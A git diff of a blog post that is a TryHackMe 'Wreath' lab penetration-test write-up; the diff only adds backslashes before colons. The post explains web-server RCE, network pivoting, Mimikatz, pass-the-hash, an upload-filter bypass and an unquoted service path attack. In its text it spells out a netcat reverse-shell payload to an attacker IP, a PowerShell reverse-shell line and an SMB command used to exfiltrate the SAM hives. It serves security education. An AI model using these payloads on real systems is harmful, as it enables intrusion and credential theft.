@@ -1,14 +1,14 @@
 ---
-layout: post
-title:  Wreath Writeup
-description: This challenge involved exploiting a vulnerable network of three computers. Two of which were susceptible to exploitations of outdated software. The last machine involved a unique foothold centered around the creation of a malicious image file. I highly encourage you to read this writeup, as I go into detail about how Mimikatz, evil-winrm, and network pivoting work.
-date:   2021-03-30 
-image:  '/images/0xd4y-logo-gray.png'
-category: tryhackme 
-tags:   [RCE, Network Pivoting, CVE, Windows, Linux]
+layout\: post
+title\:  Wreath Writeup
+description\: This challenge involved exploiting a vulnerable network of three computers. Two of which were susceptible to exploitations of outdated software. The last machine involved a unique foothold centered around the creation of a malicious image file. I highly encourage you to read this writeup, as I go into detail about how Mimikatz, evil-winrm, and network pivoting work.
+date\:   2021-03-30 
+image\:  '/images/0xd4y-logo-gray.png'
+category\: tryhackme 
+tags\:   [RCE, Network Pivoting, CVE, Windows, Linux]
 ---
 
-**This report can be read both on this site, and as its <a href = "https://0xd4y.github.io/reports/Wreath%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
+**This report can be read both on this site, and as its <a href = "https\://0xd4y.github.io/reports/Wreath%20Writeup.pdf">original report form</a>. It is highly recommended that you read the original report form instead because it is better formatted.**
 
 Wreath Network
 
@@ -22,11 +22,11 @@ A look into the exploitation of a vulnerable network and “secure” PC.
 
 0xd4y Writeups
 
-LinkedIn: [https://www.linkedin.com/in/segev-eliezer/](https://www.google.com/url?q=https://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653838005014409&usg=AOvVaw25an5vkNB0TMwYaj42Rb_z) 
+LinkedIn\: [https\://www.linkedin.com/in/segev-eliezer/](https\://www.google.com/url?q=https\://www.linkedin.com/in/segev-eliezer/&sa=D&source=editors&ust=1653838005014409&usg=AOvVaw25an5vkNB0TMwYaj42Rb_z) 
 
-Email: [0xd4yWriteups@gmail.com](mailto:0xd4yWriteups@gmail.com)
+Email\: [0xd4yWriteups@gmail.com](mailto\:0xd4yWriteups@gmail.com)
 
-Web: [https://0xd4y.github.io/](https://www.google.com/url?q=https://0xd4y.github.io/Writeups/&sa=D&source=editors&ust=1653838005015197&usg=AOvVaw0pgz6wlNqT0zFVbmvWRxvI) 
+Web\: [https\://0xd4y.github.io/](https\://www.google.com/url?q=https\://0xd4y.github.io/Writeups/&sa=D&source=editors&ust=1653838005015197&usg=AOvVaw0pgz6wlNqT0zFVbmvWRxvI) 
 
 Table of Contents
 
@@ -125,29 +125,29 @@ We see that there are only four ports open. From the nmap scan, observe that the
 
 ![](/reports/Wreath/image43.png)
 
-Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to https://thomaswreath.thm. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.
+Using the curl tool to send a GET request to the server, we see that it is trying to redirect us to https\://thomaswreath.thm. However, the DNS of the target is not set up, as can be observed from the domain not being able to route us to the requested website.
 
 ![](/reports/Wreath/image38.png)
 
-Currently, this domain is not recognized by any of our VirtualHost[[2]](#ftnt2) definitions. However, adding thomaswreath.thm to the /etc/hosts file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output:.
+Currently, this domain is not recognized by any of our VirtualHost[[2]](#ftnt2) definitions. However, adding thomaswreath.thm to the /etc/hosts file (the file in Linux which is responsible for mapping hostnames to IP addresses), and running the same curl command again produces a different output\:.
 
 ![](/reports/Wreath/image5.png)
 
 ![](/reports/Wreath/image21.png)
 
-We can add the -k flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test):
+We can add the -k flag to specify that we don’t care to verify the server’s certificate (note this is insecure but it is fine in the context of this test)\:
 
 ![](/reports/Wreath/image65.png)
 
-And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning:
+And now we get what looks to be a webpage. Browsing to this domain through Firefox, we reach yet another warning\:
 
 ![](/reports/Wreath/image7.png)
 
-One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced'' box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address:
+One thing that’s important to do before proceeding to the website is to check the server certificate. The certificate could give information about more domains that the web server may have, as well as some other useful information like names, locations, and email addresses. This can be checked by clicking on the “Advanced'' box, and then clicking on the “View Certificate” link. I didn’t see anything too interesting, but there is one email address\:
 
 ![](/reports/Wreath/image45.png)
 
-I now proceeded to the website and was met with the following page:
+I now proceeded to the website and was met with the following page\:
 
 ![](/reports/Wreath/image39.png)
 
@@ -157,7 +157,7 @@ Nothing out of the ordinary was found while browsing through this website. Howev
 
 #### Reverse Shell
 
-Seeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin:
+Seeing as this is a well known vulnerability, Metasploit already had a script to exploit this version of Webmin\:
 
 ![](/reports/Wreath/image49.png)
 
@@ -177,7 +177,7 @@ Providing the --example-hashes flag in hashcat (a tool for cracking hashes) an
 
 ![](/reports/Wreath/image27.png)
 
-Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier:
+Alternatively, another way to determine the identity of a hash is by using tools such as hashid or hash-identifier\:
 
 ![](/reports/Wreath/image37.png)
 
@@ -200,7 +200,7 @@ We see that there are a total of four other machines on the internal network (no
 
 #### Port Enumeration
 
-After discovering these two hosts, I enumerated their ports:
+After discovering these two hosts, I enumerated their ports\:
 
 ![](/reports/Wreath/image34.png)
 
@@ -212,11 +212,11 @@ The HTTP service on port 80 is a good one to forward because web servers have a 
 
 ![](/reports/Wreath/image48.png)
 
-Now when I visited localhost:18020, I was met with a web page:
+Now when I visited localhost\:18020, I was met with a web page\:
 
 ![](/reports/Wreath/image32.png)
 
-Looking at the error on the webpage, we see that there are three directories:
+Looking at the error on the webpage, we see that there are three directories\:
 
 1.  registration/login/
 2.  gitstack/
@@ -226,7 +226,7 @@ The /user subdirectory under /rest discloses information about the users on the 
 
 ![](/reports/Wreath/image44.png)
 
-Visiting /gitstack redirected me to a login page on /registration/login:
+Visiting /gitstack redirected me to a login page on /registration/login\:
 
 ![](/reports/Wreath/image50.png)
 
@@ -234,13 +234,13 @@ There is a nice handy message that says the default username and password is adm
 
 ### RCE Exploitation
 
-However, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of nikto, a tool for scanning vulnerabilities on web servers:
+However, knowing that this machine is only available on the internal network, it is possible that its software is not updated. The outdated software of this website is especially alarming when looking at the output of nikto, a tool for scanning vulnerabilities on web servers\:
 
 ![](/reports/Wreath/image9.png)
 
 Note the large amount of outdated software
 
-It follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software:
+It follows that the GitStack software used on the target might also be outdated and vulnerable. Searchsploit is a great tool for finding exploits for outdated software\:
 
 ![](/reports/Wreath/image16.png)
 
@@ -248,11 +248,11 @@ All three exploit results about GitStack are about the same version (namely 2.3.
 
 #### Exploit Analysis
 
-Before running this exploit, we will examine it to see how it works:
+Before running this exploit, we will examine it to see how it works\:
 
 ![](/reports/Wreath/image14.png)
 
-As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical vulnerability was caused by passing unsanitized user input into an exec function[[5]](#ftnt5):
+As can be seen from the image above, the password field is most likely vulnerable (as it turns out, the username field is also vulnerable). The python script injects PHP code into the password field, and the web server executes it. This critical vulnerability was caused by passing unsanitized user input into an exec function[[5]](#ftnt5)\:
 
 ![](/reports/Wreath/image15.png)
 
@@ -260,7 +260,7 @@ When running the script, it uploads a PHP web shell called exploit.php with the
 
 #### Reverse Shell
 
-I curled this web shell and provided it the -d flag to specify the data to be inputted:
+I curled this web shell and provided it the -d flag to specify the data to be inputted\:
 
 ![](/reports/Wreath/image13.png)
 
@@ -282,23 +282,23 @@ Unfortunately, our attack box cannot “talk” with the .150 machine directly, 
 
 #### Socat Relay Reverse Shell
 
-I used a socat reverse shell to demonstrate this, as it is instructive on how networking traffic can be directed:
+I used a socat reverse shell to demonstrate this, as it is instructive on how networking traffic can be directed\:
 
 1.  We are going to set up a listening port on 20001 on the .200 machine and forward all traffic from that port to 20002 on our machine.
 
 ![](/reports/Wreath/image35.png)
 
-2.  Next, we will set up netcat listening on port 20002 on our system:
+2.  Next, we will set up netcat listening on port 20002 on our system\:
 
 ![](/reports/Wreath/image66.png)
 
-3.  I used the Invoke-PowerShellTcp.ps1 nishang script and added Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001 to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell:
+3.  I used the Invoke-PowerShellTcp.ps1 nishang script and added Invoke-PowerShellTcp -Reverse -IPAddress 10.200.111.200 -Port 20001 to the bottom of the script, so that when downloading the script using IEX (more on this later), each line in the script will be automatically executed giving us a reverse shell\:
 
 ![](/reports/Wreath/image20.png)
 
 Note how we are sending the reverse shell to .200 on port 20001 (remember all traffic on port 20001 will be directed to our port 20002 on our machine).
 
-4.  Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the firewall-cmd command as such:
+4.  Now, the firewall will block inbound connections for any ports that are not specified as exceptions. We have to tell the firewall which ports it should allow for connections by using the firewall-cmd command as such\:
 
 ![](/reports/Wreath/image41.png)
 
@@ -313,7 +313,7 @@ Remember that port 20001 will be directing all traffic to us.
 
 Note the usage of three single quotes in the data argument to tell our bash shell to not interpret anything inside the quotes.
 
-Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work:        
+Unfortunately, this payload did not work (most likely due to some special characters). I am running commands through a web shell, and therefore it is likely that the server is not understanding some of the special characters in the payload. This means that most likely we will have to url-encode the payload for it to work\:        
 
 ![](/reports/Wreath/image64.png)
 
@@ -321,43 +321,43 @@ Sure enough, when I executed this command, the output hanged and I got a hit on 
 
 ![](/reports/Wreath/image77.png)
 
-So now that 0xd4y-rev.ps1 was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002:
+So now that 0xd4y-rev.ps1 was executed by the server, there should be a reverse shell getting sent to port 20001 on .200 which is getting forwarded to us on 20002\:
 
 ![](/reports/Wreath/image17.png)
 
 #### Attempting to Use Mimikatz
 
-Now, with a reverse shell as System, we have the necessary privileges to extract password hashes using Mimikatz, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command:
+Now, with a reverse shell as System, we have the necessary privileges to extract password hashes using Mimikatz, a tool used to gather credentials on a system. Before downloading Mimikatz onto the target, it’s important to check if the target is a 32bit or 64bit computer by using the systeminfo command\:
 
 ![](/reports/Wreath/image53.png)
 
-Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary:
+Noticing that this is a 64bit computer, I downloaded a 64bit mimikatz binary\:
 
 ![](/reports/Wreath/image25.png)
 
-I downloaded this binary in the C:\\Windows\\System32\\spool\\drivers\\color directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.
+I downloaded this binary in the C\:\\Windows\\System32\\spool\\drivers\\color directory out of habit, as this is a world writable path and is typically whitelisted by AppLocker, a program which restricts which files can be executed based on the file’s path.
 
-Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named sshuttle can be leveraged as a VPN into this internal network:
+Alas, running Mimikatz on an unstable shell simply does not work. I tried getting a meterpreter shell, but that did not work either. However, with ssh being open on .200, a powerful tool named sshuttle can be leveraged as a VPN into this internal network\:
 
 ![](/reports/Wreath/image12.png)
 
-We can confirm this worked by trying to curl the web page:
+We can confirm this worked by trying to curl the web page\:
 
 ![](/reports/Wreath/image10.png)
 
 ### Shell Stabilization
 
-Earlier, we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP:
+Earlier, we found that port 3389 was open on the .150 system. This is the port typically designated for Remote Desktop Protocol (RDP), and we can use this port to get a nice GUI on the box. First, I created a user with admin privileges inside the Remote Management Users group so as to allow us to remotely authenticate as the user through RDP\:
 
 ![](/reports/Wreath/image11.png)
 
-We can now use evil-winrm with our created credentials to easily get a shell on the box:
+We can now use evil-winrm with our created credentials to easily get a shell on the box\:
 
 ![](/reports/Wreath/image76.png)
 
 #### Mimikatz
 
-With the user that we created, a nice GUI instance can be established using the xfreerdp command as follows:
+With the user that we created, a nice GUI instance can be established using the xfreerdp command as follows\:
 
 ![](/reports/Wreath/image31.png)
 
@@ -375,27 +375,27 @@ These NTLM Hashes were edited so as to not expose the full hash
 
 Looking at the output of Mimikatz, we can see the hashes for all the users on the system. This is due to the single sign-on (SSO) feature of Windows. The SSO feature is used so as to not constantly ask the user to input his username and password whenever he wants to access a resource on the network, as this is simply tedious (once again, the great old war between convenience and security). Instead, the server hashes the user’s password and stores it in the SAM (Security Account Manager) hive. These credentials are then managed by the Local Security Authority (LSASS.exe), essentially enabling SSO.
 
-Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use [https://crackstation.net/](https://www.google.com/url?q=https://crackstation.net//&sa=D&source=editors&ust=1653838005042499&usg=AOvVaw1faAwek1-_0r6RfsC5v4ie)[[8]](#ftnt8)). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with -H which is used to gain access to an account by performing a pass the hash attack (PtH).
+Copying the output of Mimikatz, I saw that Thomas has an insecure password which hashcat cracked (alternatively, you can use [https\://crackstation.net/](https\://www.google.com/url?q=https\://crackstation.net//&sa=D&source=editors&ust=1653838005042499&usg=AOvVaw1faAwek1-_0r6RfsC5v4ie)[[8]](#ftnt8)). However, the Administrator password was too secure to crack, but it is still possible to use this hash for authenticating as the Administrator user. Evil-winrm has an extremely powerful flag denoted with -H which is used to gain access to an account by performing a pass the hash attack (PtH).
 
 ![](/reports/Wreath/image68.png)
 
 ##### How a Pass the Hash Attack (PtH) Works
 
-As can be seen in the image above, we authenticated as Administrator despite not specifying the password for the user, confirming that PtH worked! This attack works as follows[[9]](#ftnt9):
+As can be seen in the image above, we authenticated as Administrator despite not specifying the password for the user, confirming that PtH worked! This attack works as follows[[9]](#ftnt9)\:
 
-Pentester: Cool! I just got Administrator’s hash so let’s use evil-winrm to access the powershell.exe resource as Administrator. “Hey server! Give me powershell.exe as Administrator!”
+Pentester\: Cool! I just got Administrator’s hash so let’s use evil-winrm to access the powershell.exe resource as Administrator. “Hey server! Give me powershell.exe as Administrator!”
 
-Server: “Hi there Pentester! I know you want powershell.exe as the Administrator user, but I can’t just give it to you without verifying first that you are in fact the Administrator. I’ll test you by sending you this random 16 byte integer: 65532345234...34324234. Encrypt this with your password hash and send the response back to me.”
+Server\: “Hi there Pentester! I know you want powershell.exe as the Administrator user, but I can’t just give it to you without verifying first that you are in fact the Administrator. I’ll test you by sending you this random 16 byte integer\: 65532345234...34324234. Encrypt this with your password hash and send the response back to me.”
 
-Pentester: No problem, I’ll encrypt this 16 byte number with Administrator’s hash. “Hey Server! Here is my encrypted response: #$()#@$(@!_#)($./121 (the actual encryption doesn’t really look like this in reality, but I will use this string for the purpose of demonstration).”
+Pentester\: No problem, I’ll encrypt this 16 byte number with Administrator’s hash. “Hey Server! Here is my encrypted response\: #$()#@$(@!_#)($./121 (the actual encryption doesn’t really look like this in reality, but I will use this string for the purpose of demonstration).”
 
-Server: “Alright, thanks for the response Pentester. Hi Domain Controller! I challenged Pentester with this 16 byte integer: 65532345234...34324234, and this was his encrypted response:  #$()#@$(@!_#)($./121.
+Server\: “Alright, thanks for the response Pentester. Hi Domain Controller! I challenged Pentester with this 16 byte integer\: 65532345234...34324234, and this was his encrypted response\:  #$()#@$(@!_#)($./121.
 
-Domain Controller: Right, well I have Server’s challenge and Pentester’s response. Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator’s hash...and I can! This must be Administrator then. “Hello Server, I was able to decrypt the response with Administrator’s hash, so this must be Administrator. Grant the client the powershell.exe resource.”
+Domain Controller\: Right, well I have Server’s challenge and Pentester’s response. Let me go check my library of NTLM hashes and see if I can decrypt this response with Administrator’s hash...and I can! This must be Administrator then. “Hello Server, I was able to decrypt the response with Administrator’s hash, so this must be Administrator. Grant the client the powershell.exe resource.”
 
-Server: “Sure thing! Here you go Pentester!”
+Server\: “Sure thing! Here you go Pentester!”
 
-Pentester: “Thanks for the shell!”
+Pentester\: “Thanks for the shell!”
 
 Third Machine (.100)
 --------------------
@@ -410,31 +410,31 @@ We see that ports 80 and 3389 are open. These most likely correspond to HTTP and
 
 ### Forward SOCKS Proxy
 
-This means that we will need to create a proxy on the .150 machine. A tool called chisel comes in handy for this operation. To set up a forward SOCKS proxy on the .150 machine, we first need to follow a couple of steps:
+This means that we will need to create a proxy on the .150 machine. A tool called chisel comes in handy for this operation. To set up a forward SOCKS proxy on the .150 machine, we first need to follow a couple of steps\:
 
-1.  The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001):
+1.  The server must be told to disable the firewall on the port we want to use for the forward proxy (I will use port 30001)\:
 
 ![](/reports/Wreath/image6.png)
 
-2.  The server should then be told to listen on port 30001 for inbound connections:
+2.  The server should then be told to listen on port 30001 for inbound connections\:
 
 ![](/reports/Wreath/image18.png)
 
-3.  Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002:
+3.  Next, on the attacking box we want to connect to the listening port, and forward all data to a proxy sitting on 30002\:
 
 ![](/reports/Wreath/image71.png)
 
-4.  We then configure the web browser extension FoxyProxy to connect to this proxy:
+4.  We then configure the web browser extension FoxyProxy to connect to this proxy\:
 
 ![](/reports/Wreath/image8.png)
 
-5.  Finally, we can visit the website sitting on .100:
+5.  Finally, we can visit the website sitting on .100\:
 
 ![](/reports/Wreath/image73.png)
 
 ### Examining the Web Server
 
-Along with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following:
+Along with FoxyProxy, Wappalyzer is also a very useful browser extension which displays useful information about how a website is built. Running this extension on Thomas’s personal website, we see the following\:
 
 ![](/reports/Wreath/image36.png)
 
@@ -444,11 +444,11 @@ This website looks identical to the one on the .200 host. Thomas told us that h
 
 ![](/reports/Wreath/image75.png)
 
-Using the extractor tool from GitTools[[10]](#ftnt10), I iterated through the commits of the git repository. Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit:
+Using the extractor tool from GitTools[[10]](#ftnt10), I iterated through the commits of the git repository. Unfortunately, this tool does not list the commits by date, but this can be done manually by looking at the parent of each commit\:
 
 ![](/reports/Wreath/image74.png)
 
-We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows:
+We see that the commit starting with 70dd does not have a parent, so this must be the oldest commit. The parent of 82df is 70dd, and the parent of 345a is 82df. This means that from youngest to oldest the commits are as follows\:
 
 1.  345a
 2.  82df
@@ -460,11 +460,11 @@ We can examine the code from the most recent commit. Seeing as Wappanalyzer iden
 
 Taking a look at the file, there seems to be an upload feature that redirects uploaded files to a directory called uploads/..![](/reports/Wreath/image62.png)
 
-The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are jpg, jpeg, png, and gif, so I examined how the webpage identifies the extension:
+The filter checks if a file is an image based on its size and if a file ends with a valid extension. We can see that the allowed extensions are jpg, jpeg, png, and gif, so I examined how the webpage identifies the extension\:
 
 ![](/reports/Wreath/image60.png)
 
-The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called reverse-shell.jpg.php, the code will split the file as follows:
+The explode function splits a string into an array based on a specified parameter. In the code, it is set to split based on the period character and grabs the string at index one (note that this is the second element in the array, as the first element is at index zero). It then compares this string with one of the allowed extensions. The problem with this is that upon uploading a file called reverse-shell.jpg.php, the code will split the file as follows\:
 
 [‘reverse-shell’,’jpg’,’php’]
 
@@ -478,7 +478,7 @@ A basic HTTP authentication is required to access the /resources directory, but
 
 ![](/reports/Wreath/image3.png)
 
-I then uploaded the malicious image file (0xd4y-image.jpg.php):
+I then uploaded the malicious image file (0xd4y-image.jpg.php)\:
 
 ![](/reports/Wreath/image51.png)
 
@@ -486,7 +486,7 @@ Visiting the uploaded script on resources/uploads/0xd4y-image.jpg.php reveals t
 
 ![](/reports/Wreath/image63.png)
 
-And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using systeminfo, I uploaded a 64bit netcat binary[[12]](#ftnt12) and called it 0xd4y-nc.exe. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload: powershell.exe%20C:\\xampp\\htdocs\\resources\\uploads\\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exe
+And the php web shell works! The next step is to get a reverse shell. After identifying the target as a 64 bit machine by using systeminfo, I uploaded a 64bit netcat binary[[12]](#ftnt12) and called it 0xd4y-nc.exe. I then set up an HTTP server on my local box with python and downloaded the binary onto the system with curl. To get a reverse shell, I used a simple nc reverse shell payload\: powershell.exe%20C\:\\xampp\\htdocs\\resources\\uploads\\0xd4y-nc.exe%2010.50.112.6%20443%20-e%20cmd.exe
 
 ![](/reports/Wreath/image30.png)
 
@@ -506,7 +506,7 @@ I ignored this potential privilege escalation vector due to its greater complexi
 
 #### Unquoted Service Path Attack
 
- It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in C:\\Windows.
+ It’s likely that the default Windows paths will not be vulnerable to this sort of attack, so I focused on services that were not in C\:\\Windows.
 
 ![](/reports/Wreath/image67.png)
 
@@ -514,15 +514,15 @@ As it turned out, there was a service that contained an unquoted path called Sys
 
 ##### How an Unquoted Service Path Attack Works
 
-Due to there not being quotes around the path to this service, Windows does not know where to execute the desired binary. Seeing as the path for this vulnerable service is C:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe, Windows will check for a binary in the following order[[15]](#ftnt15):
+Due to there not being quotes around the path to this service, Windows does not know where to execute the desired binary. Seeing as the path for this vulnerable service is C\:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe, Windows will check for a binary in the following order[[15]](#ftnt15)\:
 
-1.  C:\\Program.exe
-2.  C:\\Program Files (x86)\\System.exe
-3.  C:\\Program Files (x86)\\System Explorer\\System.exe
-4.  C:\\Program Files (x86)\\System Explorer\\System Explorer\\service.exe
-5.  C:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe
+1.  C\:\\Program.exe
+2.  C\:\\Program Files (x86)\\System.exe
+3.  C\:\\Program Files (x86)\\System Explorer\\System.exe
+4.  C\:\\Program Files (x86)\\System Explorer\\System Explorer\\service.exe
+5.  C\:\\Program Files (x86)\\System Explorer\\System Explorer\\service\\SystemExplorerService64.exe
 
-It is highly unlikely that the compromised user has write access to C:\\Program Files(x86), but it is probable that the user can write to C:\\Program Files(x86)\\System Explorer. Therefore, we can create a malicious binary called System.exe in the appropriate path, and it will get executed.
+It is highly unlikely that the compromised user has write access to C\:\\Program Files(x86), but it is probable that the user can write to C\:\\Program Files(x86)\\System Explorer. Therefore, we can create a malicious binary called System.exe in the appropriate path, and it will get executed.
 
 ##### Creating a Malicious Binary
 
@@ -538,25 +538,25 @@ Seeing as we are part of the BUILTIN\\Users group, we have FullControl to this s
 
 ![](/reports/Wreath/image78.png)
 
-Following the creation of the script, I compiled this program with mcs, a C# compiler:
+Following the creation of the script, I compiled this program with mcs, a C# compiler\:
 
 ![](/reports/Wreath/image26.png)
 
-After compiling the program, I renamed malicious.exe to System.exe. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the C:\\Program Files (x86)\\System Explorer\\ directory.
+After compiling the program, I renamed malicious.exe to System.exe. Seeing as System is running the service we are trying to hijack, it follows that we should get a reverse shell as System when restarting the service. After downloading the binary to the target, I copied it over to the C\:\\Program Files (x86)\\System Explorer\\ directory.
 
 ![](/reports/Wreath/image19.png)
 
-With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service:
+With the malicious binary in place, I set up a netcat listener on port 443 (as specified in the C# code) before restarting the service\:
 
 ![](/reports/Wreath/image57.png)
 
-Typing sc stop SystemExplorerHelpService (to stop the service) and sc start SystemExplorerHelpService (to start the service) resulted in a reverse shell as System:
+Typing sc stop SystemExplorerHelpService (to stop the service) and sc start SystemExplorerHelpService (to start the service) resulted in a reverse shell as System\:
 
 ![](/reports/Wreath/image2.png)
 
 ### Data Exfiltration
 
-Now, with a reverse shell as System, we can extract the stored credentials on this system. Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the SAM and SYSTEM files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass and transferred the SAM and SYSTEM hives as follows:
+Now, with a reverse shell as System, we can extract the stored credentials on this system. Mimikatz cannot be used as Antivirus is installed on this machine. However, because we are System, we can copy the SAM and SYSTEM files and locally extract the stored hashes. I set up an SMB server on my machine to download the files with sudo impacket-smbserver share . -smb2support -username 0xd4y -password pass and transferred the SAM and SYSTEM hives as follows\:
 
 ![](/reports/Wreath/image61.png)
 
@@ -584,7 +584,7 @@ Conclusion
 
 The attack surface of a web server is much bigger than most other services. It is essential to be wary of which services are running as a privileged user. There was no need for local privilege escalation in two out of three compromised machines during this penetration test. If possible, it should be refrained from using root to run services unless it is absolutely necessary. This will cause a greater difficulty for an attacker to attain root access on a system, and will greatly mitigate the potential damage in case of a breach.
 
-The client had multiple critical vulnerabilities in his network. The specific remediations for patching the vulnerabilities outlined in this report are as follows:
+The client had multiple critical vulnerabilities in his network. The specific remediations for patching the vulnerabilities outlined in this report are as follows\:
 
 *   Install the latest software for all running services, even if a system is only running on an internal network with no outside internet access
 
@@ -611,32 +611,32 @@ The goals of this penetration test were met. As requested by the client, I was a
 
 * * *
 
-[[1]](#ftnt_ref1) [https://tryhackme.com/room/wreath](https://www.google.com/url?q=https://tryhackme.com/room/wreath&sa=D&source=editors&ust=1653838005064997&usg=AOvVaw11zrlOmfNWzJa0CDhyLmIX) 
+[[1]](#ftnt_ref1) [https\://tryhackme.com/room/wreath](https\://www.google.com/url?q=https\://tryhackme.com/room/wreath&sa=D&source=editors&ust=1653838005064997&usg=AOvVaw11zrlOmfNWzJa0CDhyLmIX) 
 
-[[2]](#ftnt_ref2) [https://httpd.apache.org/docs/2.4/vhosts/details.html](https://www.google.com/url?q=https://httpd.apache.org/docs/2.4/vhosts/details.html&sa=D&source=editors&ust=1653838005066508&usg=AOvVaw38AzkPd909N2hWUNYHS_3q) 
+[[2]](#ftnt_ref2) [https\://httpd.apache.org/docs/2.4/vhosts/details.html](https\://www.google.com/url?q=https\://httpd.apache.org/docs/2.4/vhosts/details.html&sa=D&source=editors&ust=1653838005066508&usg=AOvVaw38AzkPd909N2hWUNYHS_3q) 
 
-[[3]](#ftnt_ref3) [https://nvd.nist.gov/vuln/detail/CVE-2019-15107](https://www.google.com/url?q=https://nvd.nist.gov/vuln/detail/CVE-2019-15107&sa=D&source=editors&ust=1653838005061416&usg=AOvVaw2CTBmXjzEPsODH3Rq_PnrP)   
+[[3]](#ftnt_ref3) [https\://nvd.nist.gov/vuln/detail/CVE-2019-15107](https\://www.google.com/url?q=https\://nvd.nist.gov/vuln/detail/CVE-2019-15107&sa=D&source=editors&ust=1653838005061416&usg=AOvVaw2CTBmXjzEPsODH3Rq_PnrP)   
 
-[[4]](#ftnt_ref4) [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap](https://www.google.com/url?q=https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap&sa=D&source=editors&ust=1653838005061892&usg=AOvVaw31Hh8jsrhN-DIWR9yXI6La) 
+[[4]](#ftnt_ref4) [https\://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap](https\://www.google.com/url?q=https\://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap&sa=D&source=editors&ust=1653838005061892&usg=AOvVaw31Hh8jsrhN-DIWR9yXI6La) 
 
-[[5]](#ftnt_ref5) [https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf](https://www.google.com/url?q=https://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf&sa=D&source=editors&ust=1653838005062277&usg=AOvVaw3W47ioy1JtnYBx9a6bnduz) 
+[[5]](#ftnt_ref5) [https\://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf](https\://www.google.com/url?q=https\://owasp.org/www-chapter-ghana/assets/slides/OWASP_Gitstack_Presentation.pdf&sa=D&source=editors&ust=1653838005062277&usg=AOvVaw3W47ioy1JtnYBx9a6bnduz) 
 
-[[6]](#ftnt_ref6) [https://github.com/samratashok/nishang](https://www.google.com/url?q=https://github.com/samratashok/nishang&sa=D&source=editors&ust=1653838005065364&usg=AOvVaw1yBNhpiAJM99kh-lW5N-c1) 
+[[6]](#ftnt_ref6) [https\://github.com/samratashok/nishang](https\://www.google.com/url?q=https\://github.com/samratashok/nishang&sa=D&source=editors&ust=1653838005065364&usg=AOvVaw1yBNhpiAJM99kh-lW5N-c1) 
 
